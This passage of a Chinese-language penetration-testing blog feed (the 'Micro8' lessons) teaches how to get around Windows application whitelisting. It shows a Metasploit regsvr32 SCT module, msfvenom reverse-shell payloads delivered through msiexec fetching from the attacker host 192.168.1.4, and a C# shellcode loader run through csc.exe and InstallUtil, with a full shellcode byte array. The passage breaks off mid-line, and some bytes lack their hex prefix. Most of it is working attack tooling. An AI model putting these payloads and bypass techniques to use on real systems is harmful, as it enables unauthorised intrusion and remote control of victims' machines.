class="subst">#&#123;Rex::Text.rand_text_hex12&#125;</span>"</span></span><br><span class="line"><span class="keyword">end</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_sct_file</span><span class="params">(command)</span></span></span><br><span class="line"><span class="string">%&#123;&lt;?XML version="1.0"?&gt;&lt;scriptlet&gt;&lt;registrationprogid="\#&#123;rand_text_a lphanumeric 8&#125;</span><span class="string">"</span></span><br><span class="line"><span class="string">classid="</span>&#123;<span class="comment">#&#123;rand_class_id&#125;&#125;"&gt;&lt;script&gt;&lt;![CDATA[ var r = ne wActiveXObject("WScript.Shell").Run("#&#123;command&#125;",0);]]&gt;&lt;script&gt;&lt;/registration&gt;&lt;/scriptlet&gt;&#125;</span></span><br><span class="line"><span class="keyword">end</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p><strong>使用方法：</strong></p><p>copy regsvr32_applocker_bypass_server.rb to /usr/share/metasploit-framework/modules/exploits/windows/misc  </p><p><img src="../do/media/f0b5c59eb47dd53e8780a31320b41113.jpg" alt></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>78、基于白名单Msiexec执行payload第八季</title>
      <link href="/article/78_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%85%AB%E5%AD%A3.html"/>
      <url>/article/78_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%85%AB%E5%AD%A3.html</url>
      
        <content type="html"><![CDATA[<p><strong>注：</strong>请多喝点热水或者凉白开，身体特别重要。</p><h3 id="Msiexec简介："><a href="#Msiexec简介：" class="headerlink" title="Msiexec简介："></a>Msiexec简介：</h3><p>Msiexec 是 Windows Installer 的一部分。用于安装 Windows Installer 安装包（MSI）,一般在运行 Microsoft Update 安装更新或安装部分软件的时候出现，占用内存比较大。并且集成于 Windows 2003，Windows 7 等。</p><p><strong>说明：</strong>Msiexec.exe所在路径已被系统添加PATH环境变量中，因此，Msiexec命令可识别。</p><h3 id="基于白名单Msiexec-exe配置payload："><a href="#基于白名单Msiexec-exe配置payload：" class="headerlink" title="基于白名单Msiexec.exe配置payload："></a>基于白名单Msiexec.exe配置payload：</h3><p>Windows 2003 默认位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32\msiexec.exe</span><br><span class="line">C:\WINDOWS\SysWOW64\msiexec.exe</span><br></pre></td></tr></table></figure><p><strong>攻击机：</strong>192.168.1.4 Debian<br><strong>靶机：</strong> 192.168.1.119 Windows 2003</p><h3 id="配置攻击机msf："><a href="#配置攻击机msf：" class="headerlink" title="配置攻击机msf："></a>配置攻击机msf：</h3><p><img src="../do/media/2649cf5ad568984ff20e46111fa98b12.jpg" alt></p><h3 id="配置payload："><a href="#配置payload：" class="headerlink" title="配置payload："></a>配置payload：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom ‐p windows/x64/shell/reverse_tcp LHOST=192.168.1.4 LPORT=53 ‐ f msi &gt; Micropoor_rev_x64_53.txt</span><br></pre></td></tr></table></figure><p><img src="../do/media/5c011fcb99c3411ae97fb78affcca15d.jpg" alt></p><p><img src="../do/media/69b03297f582100971130f6ac6a9e1e4.jpg" alt></p><h3 id="靶机执行："><a href="#靶机执行：" class="headerlink" title="靶机执行："></a>靶机执行：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\msiexec.exe /q /i http://192.168.1.4/Micropoor_rev\_x64_53.txt</span><br></pre></td></tr></table></figure><p><img src="../do/media/39acc13b2f9da5473510eed6d26c74a1.jpg" alt></p><p><img src="../do/media/c70a2131fc4a5392c8405806438ca269.jpg" alt></p><p><img src="../do/media/7f9e95b7d3fa9393cd1e6a4978294430.jpg" alt></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>77、基于白名单Csc.exe执行payload第七季</title>
      <link href="/article/77_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E4%B8%83%E5%AD%A3.html"/>
      <url>/article/77_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E4%B8%83%E5%AD%A3.html</url>
      
        <content type="html"><![CDATA[<p><strong>注：</strong>请多喝点热水或者凉白开，身体特别重要。</p><h3 id="Csc-exe简介："><a href="#Csc-exe简介：" class="headerlink" title="Csc.exe简介："></a>Csc.exe简介：</h3><p>C#的在Windows平台下的编译器名称是Csc.exe，如果你的.NET FrameWork SDK安装在C盘，那么你可以在C:\WINNT\Microsoft.NET\Framework\xxxxx目录中发现它。为了使用方便，你可以手动把这个目录添加到Path环境变量中去。用Csc.exe编译HelloWorld.cs非常简单，打开命令提示符，并切换到存放<br>test.cs文件的目录中，输入下列行命令:<code>csc /target:exe test.cs</code> 将Ttest.cs 编译成名为 test.exe 的 console 应用程序</p><p><strong>说明：</strong> Csc.exe所在路径没有被系统添加PATH环境变量中，因此，csc命令无法识别。</p><h3 id="基于白名单Csc-exe配置payload："><a href="#基于白名单Csc-exe配置payload：" class="headerlink" title="基于白名单Csc.exe配置payload："></a>基于白名单Csc.exe配置payload：</h3><p>Windows 7 默认位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe</span><br></pre></td></tr></table></figure><p><strong>攻击机：</strong>192.168.1.4 Debian<br><strong>靶机：</strong>192.168.1.5 Windows 7</p><h3 id="配置攻击机msf："><a href="#配置攻击机msf：" class="headerlink" title="配置攻击机msf："></a>配置攻击机msf：</h3><p><img src="../do/media/11038c8eb1bb179e7f838fd9cacc18bc.jpg" alt></p><h3 id="配置payload："><a href="#配置payload：" class="headerlink" title="配置payload："></a>配置payload：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom ‐p windows/x64/shell/reverse_tcp LHOST=192.168.1.4 LPORT=53 ‐ f csharp</span><br></pre></td></tr></table></figure><p><img src="../do/media/0d4d8972d612f1578e72bbfd6b9acd17.jpg" alt></p><p>copy buf 到 Micropoor_Csc.cs shellcode 中。<br><img src="../do/media/9e59f8c6977c4a11fa1cc86996043b31.jpg" alt></p><h3 id="靶机执行："><a href="#靶机执行：" class="headerlink" title="靶机执行："></a>靶机执行：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.Ente rpriseServices.dll /r:System.IO.Compression.dll /target:library /out:Mic opoor.exe /platform:x64 /unsafe C:\Users\John\Desktop\Micropoor_Csc.cs</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\John\Desktop\Micropoor.exe</span><br></pre></td></tr></table></figure><p><img src="../do/media/04e49b7638caec7568dd6d7957b2e701.jpg" alt></p><p><strong>与第七十二课相比，payload更为灵活。</strong></p><h3 id="附录：Micropoor-Csc-cs"><a href="#附录：Micropoor-Csc-cs" class="headerlink" title="附录：Micropoor_Csc.cs"></a>附录：Micropoor_Csc.cs</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> System.Configuration.Install;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// msfvenom ‐p windows/x64/shell/reverse_tcp LHOST=192.168.1.4 LPORT=53 ‐f csharp </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">[<span class="meta">System.ComponentModel.RunInstaller(true)</span>]</span><br><span class="line"></span><br><span class="line">public class Sample : System.Configuration.Install.Installer</span><br><span class="line"></span><br><span class="line">&#123; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">Uninstall</span>(<span class="params">System.Collections.IDictionary savedState</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"></span><br><span class="line">Shellcode.Exec(); </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Shellcode</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Exec</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] shellcode = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">510</span>] &#123;</span><br><span class="line"></span><br><span class="line"><span class="number">0xfc</span>,<span class="number">0x48</span>,<span class="number">0x83</span>,<span class="number">0xe4</span>,<span class="number">0xf0</span>,<span class="number">0xe8</span>,<span class="number">0xcc</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x41</span>,<span class="number">0x51</span>,<span class="number">0x41</span>,<span class="number">0x50</span>,<span class="number">0x52</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x51</span>,<span class="number">0x56</span>,<span class="number">0x48</span>,<span class="number">0x31</span>,<span class="number">0xd2</span>,<span class="number">0x65</span>,<span class="number">0x48</span>,<span class="number">0x8b</span>,<span class="number">0x52</span>,<span class="number">0x60</span>,<span class="number">0x48</span>,<span class="number">0x8b</span>,<span class="number">0x52</span>,<span class="number">0x18</span>,x48,</span><br><span class="line"></span><br><span class="line"><span class="number">0x8b</span>,<span class="number">0x52</span>,<span class="number">0x20</span>,<span class="number">0x48</span>,<span class="number">0x8b</span>,<span class="number">0x72</span>,<span class="number">0x50</span>,<span class="number">0x48</span>,<span class="number">0x0f</span>,<span class="number">0xb7</span>,<span class="number">0x4a</span>,<span class="number">0x4a</span>,<span class="number">0x4d</span>,<span class="number">0x31</span>,xc9,</span><br><span class="line"></span><br><span class="line"><span class="number">0x48</span>,<span class="number">0x31</span>,<span class="number">0xc0</span>,<span class="number">0xac</span>,<span class="number">0x3c</span>,<span class="number">0x61</span>,<span class="number">0x7c</span>,<span class="number">0x02</span>,<span class="number">0x2c</span>,<span class="number">0x20</span>,<span class="number">0x41</span>,<span class="number">0xc1</span>,<span class="number">0xc9</span>,<span class="number">0x0d</span>,x41,</span><br><span class="line"></span><br><span class="line"><span class="number">0x01</span>,<span class="number">0xc1</span>,<span class="number">0xe2</span>,<span class="number">0xed</span>,<span class="number">0x52</span>,<span class="number">0x41</span>,<span class="number">0x51</span>,<span class="number">0x48</span>,<span class="number">0x8b</span>,<span class="number">0x52</span>,<span class="number">0x20</span>,<span class="number">0x8b</span>,<span class="number">0x42</span>,<span class="number">0x3c</span>,x48,</span><br><span class="line"></span><br><span class="line"><span class="number">0x01</span>,<span class="number">0xd0</span>,<span class="number">0x66</span>,<span class="number">0x81</span>,<span class="number">0x78</span>,<span class="number">0x18</span>,<span class="number">0x0b</span>,<span class="number">0x02</span>,<span class="number">0x0f</span>,<span class="number">0x85</span>,<span class="number">0x72</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,x8b,</span><br><span class="line"></span><br><span class="line"><span class="number">0x80</span>,<span class="number">0x88</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x48</span>,<span class="number">0x85</span>,<span class="number">0xc0</span>,<span class="number">0x74</span>,<span class="number">0x67</span>,<span class="number">0x48</span>,<span class="number">0x01</span>,<span class="number">0xd0</span>,<span class="number">0x50</span>,x8b,</span><br><span class="line"></span><br><span class="line"><span class="number">0x48</span>,<span class="number">0x18</span>,<span class="number">0x44</span>,<span class="number">0x8b</span>,<span class="number">0x40</span>,<span class="number">0x20</span>,<span class="number">0x49</span>,<span class="number">0x01</span>,<span class="number">0xd0</span>,<span class="number">0xe3</span>,<span class="number">0x56</span>,<span class="number">0x48</span>,<span class="number">0xff</span>,<span class="number">0xc9</span>,x41,</span><br><span class="line"></span><br><span class="line"><span class="number">0x8b</span>,<span class="number">0x34</span>,<span class="number">0x88</span>,<span class="number">0x48</span>,<span class="number">0x01</span>,<span class="number">0xd6</span>,<span class="number">0x4d</span>,<span class="number">0x31</span>,<span class="number">0xc9</span>,<span class="number">0x48</span>,<span class="number">0x31</span>,<span class="number">0xc0</span>,<span class="number">0xac</span>,<span class="number">0x41</span>,xc1,</span><br><span class="line"></span><br><span class="line"><span class="number">0xc9</span>,<span class="number">0x0d</span>,<span class="number">0x41</span>,<span class="number">0x01</span>,<span class="number">0xc1</span>,<span class="number">0x38</span>,<span class="number">0xe0</span>,<span class="number">0x75</span>,<span class="number">0xf1</span>,<span class="number">0x4c</span>,<span class="number">0x03</span>,<span class="number">0x4c</span>,<span class="number">0x24</span>,<span class="number">0x08</span>,x45,</span><br><span class="line"></span><br><span class="line"><span class="number">0x39</span>,<span class="number">0xd1</span>,<span class="number">0x75</span>,<span class="number">0xd8</span>,<span class="number">0x58</span>,<span class="number">0x44</span>,<span class="number">0x8b</span>,<span class="number">0x40</span>,<span class="number">0x24</span>,<span class="number">0x49</span>,<span class="number">0x01</span>,<span class="number">0xd0</span>,<span class="number">0x66</span>,<span class="number">0x41</span>,x8b,</span><br><span class="line"></span><br><span class="line"><span class="number">0x0c</span>,<span class="number">0x48</span>,<span class="number">0x44</span>,<span class="number">0x8b</span>,<span class="number">0x40</span>,<span class="number">0x1c</span>,<span class="number">0x49</span>,<span class="number">0x01</span>,<span class="number">0xd0</span>,<span class="number">0x41</span>,<span class="number">0x8b</span>,<span class="number">0x04</span>,<span class="number">0x88</span>,<span class="number">0x48</span>,x01,</span><br><span class="line"></span><br><span class="line"><span class="number">0xd0</span>,<span class="number">0x41</span>,<span class="number">0x58</span>,<span class="number">0x41</span>,<span class="number">0x58</span>,<span class="number">0x5e</span>,<span class="number">0x59</span>,<span class="number">0x5a</span>,<span class="number">0x41</span>,<span class="number">0x58</span>,<span class="number">0x41</span>,<span class="number">0x59</span>,<span class="number">0x41</span>,<span class="number">0x5a</span>,x48,</span><br><span class="line"></span><br><span class="line"><span class="number">0x83</span>,<span class="number">0xec</span>,<span class="number">0x20</span>,<span class="number">0x41</span>,<span class="number">0x52</span>,<span class="number">0xff</span>,<span class="number">0xe0</span>,<span class="number">0x58</span>,<span class="number">0x41</span>,<span class="number">0x59</span>,<span class="number">0x5a</span>,<span class="number">0x48</span>,<span class="number">0x8b</span>,<span class="number">0x12</span>,xe9,</span><br><span class="line"></span><br><span class="line"><span class="number">0x4b</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0x5d</span>,<span class="number">0x49</span>,<span class="number">0xbe</span>,<span class="number">0x77</span>,<span class="number">0x73</span>,<span class="number">0x32</span>,<span class="number">0x5f</span>,<span class="number">0x33</span>,<span class="number">0x32</span>,<span class="number">0x00</span>,x00,</span><br><span class="line"></span><br><span class="line"><span class="number">0x41</span>,<span class="number">0x56</span>,<span class="number">0x49</span>,<span class="number">0x89</span>,<span class="number">0xe6</span>,<span class="number">0x48</span>,<span class="number">0x81</span>,<span class="number">0xec</span>,<span class="number">0xa0</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x49</span>,<span class="number">0x89</span>,xe5,</span><br><span class="line"></span><br><span class="line"><span class="number">0x49</span>,<span class="number">0xbc</span>,<span class="number">0x02</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x35</span>,<span class="number">0xc0</span>,<span class="number">0xa8</span>,<span class="number">0x01</span>,<span class="number">0x04</span>,<span class="number">0x41</span>,<span class="number">0x54</span>,<span class="number">0x49</span>,<span class="number">0x89</span>,xe4,</span><br><span class="line"></span><br><span class="line"><span class="number">0x4c</span>,<span class="number">0x89</span>,<span class="number">0xf1</span>,<span class="number">0x41</span>,<span class="number">0xba</span>,<span class="number">0x4c</span>,<span class="number">0x77</span>,<span class="number">0x26</span>,<span class="number">0x07</span>,<span class="number">0xff</span>,<span class="number">0xd5</span>,<span class="number">0x4c</span>,<span class="number">0x89</span>,<span class="number">0xea</span>,x68,</span><br><span class="line"></span><br><span class="line"><span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x59</span>,<span class="number">0x41</span>,<span class="number">0xba</span>,<span class="number">0x29</span>,<span class="number">0x80</span>,<span class="number">0x6b</span>,<span class="number">0x00</span>,<span class="number">0xff</span>,<span class="number">0xd5</span>,<span class="number">0x6a</span>,x0a,</span><br><span class="line"></span><br><span class="line"><span class="number">0x41</span>,<span class="number">0x5e</span>,<span class="number">0x50</span>,<span class="number">0x50</span>,<span class="number">0x4d</span>,<span class="number">0x31</span>,<span class="number">0xc9</span>,<span class="number">0x4d</span>,<span class="number">0x31</span>,<span class="number">0xc0</span>,<span class="number">0x48</span>,<span class="number">0xff</span>,<span class="number">0xc0</span>,<span class="number">0x48</span>,x89,</span><br><span class="line"></span><br><span class="line"><span class="number">0xc2</span>,<span class="number">0x48</span>,<span class="number">0xff</span>,<span class="number">0xc0</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xc1</span>,<span class="number">0x41</span>,<span class="number">0xba</span>,<span class="number">0xea</span>,<span class="number">0x0f</span>,<span class="number">0xdf</span>,<span class="number">0xe0</span>,<span class="number">0xff</span>,xd5,</span><br><span class="line"></span><br><span class="line"><span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xc7</span>,<span class="number">0x6a</span>,<span class="number">0x10</span>,<span class="number">0x41</span>,<span class="number">0x58</span>,<span class="number">0x4c</span>,<span class="number">0x89</span>,<span class="number">0xe2</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xf9</span>,<span class="number">0x41</span>,xba,</span><br><span class="line"></span><br><span class="line"><span class="number">0x99</span>,<span class="number">0xa5</span>,<span class="number">0x74</span>,<span class="number">0x61</span>,<span class="number">0xff</span>,<span class="number">0xd5</span>,<span class="number">0x85</span>,<span class="number">0xc0</span>,<span class="number">0x74</span>,<span class="number">0x0a</span>,<span class="number">0x49</span>,<span class="number">0xff</span>,<span class="number">0xce</span>,<span class="number">0x75</span>,xe5,</span><br><span class="line"></span><br><span class="line"><span class="number">0xe8</span>,<span class="number">0x93</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x48</span>,<span class="number">0x83</span>,<span class="number">0xec</span>,<span class="number">0x10</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe2</span>,<span class="number">0x4d</span>,<span class="number">0x31</span>,xc9,</span><br><span class="line"></span><br><span class="line"><span class="number">0x6a</span>,<span class="number">0x04</span>,<span class="number">0x41</span>,<span class="number">0x58</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xf9</span>,<span class="number">0x41</span>,<span class="number">0xba</span>,<span class="number">0x02</span>,<span class="number">0xd9</span>,<span class="number">0xc8</span>,<span class="number">0x5f</span>,<span class="number">0xff</span>,xd5,</span><br><span class="line"></span><br><span class="line"><span class="number">0x83</span>,<span class="number">0xf8</span>,<span class="number">0x00</span>,<span class="number">0x7e</span>,<span class="number">0x55</span>,<span class="number">0x48</span>,<span class="number">0x83</span>,<span class="number">0xc4</span>,<span class="number">0x20</span>,<span class="number">0x5e</span>,<span class="number">0x89</span>,<span class="number">0xf6</span>,<span class="number">0x6a</span>,<span class="number">0x40</span>,x41,</span><br><span class="line"></span><br><span class="line"><span class="number">0x59</span>,<span class="number">0x68</span>,<span class="number">0x00</span>,<span class="number">0x10</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x41</span>,<span class="number">0x58</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xf2</span>,<span class="number">0x48</span>,<span class="number">0x31</span>,<span class="number">0xc9</span>,x41,</span><br><span class="line"></span><br><span class="line"><span class="number">0xba</span>,<span class="number">0x58</span>,<span class="number">0xa4</span>,<span class="number">0x53</span>,<span class="number">0xe5</span>,<span class="number">0xff</span>,<span class="number">0xd5</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xc3</span>,<span class="number">0x49</span>,<span class="number">0x89</span>,<span class="number">0xc7</span>,<span class="number">0x4d</span>,x31,</span><br><span class="line"></span><br><span class="line"><span class="number">0xc9</span>,<span class="number">0x49</span>,<span class="number">0x89</span>,<span class="number">0xf0</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xda</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xf9</span>,<span class="number">0x41</span>,<span class="number">0xba</span>,<span class="number">0x02</span>,<span class="number">0xd9</span>,xc8,</span><br><span class="line"></span><br><span class="line"><span class="number">0x5f</span>,<span class="number">0xff</span>,<span class="number">0xd5</span>,<span class="number">0x83</span>,<span class="number">0xf8</span>,<span class="number">0x00</span>,<span class="number">0x7d</span>,<span class="number">0x28</span>,<span class="number">0x58</span>,<span class="number">0x41</span>,<span class="number">0x57</span>,<span class="number">0x59</span>,<span class="number">0x68</span>,<span class="number">0x00</span>,x40,</span><br><span class="line"></span><br><span class="line"><span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x41</span>,<span class="number">0x58</span>,<span class="number">0x6a</span>,<span class="number">0x00</span>,<span class="number">0x5a</span>,<span class="number">0x41</span>,<span class="number">0xba</span>,<span class="number">0x0b</span>,<span class="number">0x2f</span>,<span class="number">0x0f</span>,<span class="number">0x30</span>,<span class="number">0xff</span>,xd5,</span><br><span class="line"></span><br><span class="line"><span class="number">0x57</span>,<span class="number">0x59</span>,<span class="number">0x41</span>,<span class="number">0xba</span>,<span class="number">0x75</span>,<span class="number">0x6e</span>,<span class="number">0x4d</span>,<span class="number">0x61</span>,<span class="number">0xff</span>,<span class="number">0xd5</span>,<span class="number">0x49</span>,<span class="number">0xff</span>,<span class="number">0xce</span>,<span class="number">0xe9</span>,x3c,</span><br><span class="line"></span><br><span class="line"><span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0x48</span>,<span class="number">0x01</span>,<span class="number">0xc3</span>,<span class="number">0x48</span>,<span class="number">0x29</span>,<span class="number">0xc6</span>,<span class="number">0x48</span>,<span class="number">0x85</span>,<span class="number">0xf6</span>,<span class="number">0x75</span>,<span class="number">0xb4</span>,x41,</span><br><span class="line"></span><br><span class="line"><span class="number">0xff</span>,<span class="number">0xe7</span>,<span class="number">0x58</span>,<span class="number">0x6a</span>,<span class="number">0x00</span>,<span class="number">0x59</span>,<span class="number">0x49</span>,<span class="number">0xc7</span>,<span class="number">0xc2</span>,<span class="number">0xf0</span>,<span class="number">0xb5</span>,<span class="number">0xa2</span>,<span class="number">0x56</span>,<span class="number">0xff</span>,xd5 &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">UInt32 funcAddr = VirtualAlloc(<span 